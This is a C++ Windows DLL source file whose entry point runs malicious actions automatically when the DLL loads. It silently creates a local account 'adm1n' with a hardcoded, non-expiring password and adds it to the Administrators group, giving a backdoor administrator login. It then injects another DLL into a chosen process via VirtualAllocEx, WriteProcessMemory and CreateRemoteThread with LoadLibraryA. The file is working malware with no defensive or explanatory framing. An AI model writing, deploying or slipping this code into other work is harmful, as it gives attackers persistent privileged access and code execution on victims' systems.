// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <lm.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

wchar_t username[256] = L"adm1n";
wchar_t password[256] = L"P@ssw0rd";

BOOL InjectDLL(HANDLE hProcess, const char* dllPath) {
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemotePath) return FALSE;

    if (!WriteProcessMemory(hProcess, pRemotePath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (!hKernel32) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return FALSE;
    }

    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Create the user
        USER_INFO_1 user;
        memset(&user, 0, sizeof(USER_INFO_1));
        user.usri1_name = username;
        user.usri1_password = password;
        user.usri1_priv = USER_PRIV_USER;
        user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
        NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);

        // Add the user to the administrators group
        LOCALGROUP_MEMBERS_INFO_3 members;
        members.lgrmi3_domainandname = username;
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&members, 1);

        // Inject NSFW.dll into a target process
        DWORD processId = 1234; // Replace with the target process ID
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (hProcess) {
            InjectDLL(hProcess, "C:\\Path\\To\\NSFW.dll");
            CloseHandle(hProcess);
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
